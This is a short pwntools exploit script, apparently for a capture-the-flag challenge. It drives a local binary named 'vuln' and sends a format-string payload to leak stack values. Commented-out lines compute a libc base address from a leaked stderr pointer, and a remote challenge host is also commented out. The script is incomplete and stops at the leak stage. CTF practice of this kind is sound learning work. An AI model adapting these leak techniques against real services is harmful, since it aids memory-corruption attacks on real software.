from pwn import *
from ctypes import *
import time

context(os='linux', arch='amd64')
p = process('./pwn/vuln')
elf = ELF('./pwn/vuln')
# p = remote('week-1.hgame.lwsec.cn', 30707)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recv()
# payload = b'a' * 180 + b'bbbb'
# p.send(payload)
# p.recvuntil(b'bbbb')
# stderr_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
# print(hex(stderr_addr))
#
# base_addr = stderr_addr - libc.symbols['_IO_2_1_stderr_']
# print(hex(base_addr))
payload = b'a' * 8
p.sendline(payload)
time.sleep(1)
p.recvuntil(b'anything else?(Y/n)')
p.sendline(b'n')

payload = b'%p  ' * 10
p.recvuntil(b'Yukkri prepared a gift for you: ')
# gdb.attach(p)
# pause()
p.send(payload)

p.interactive()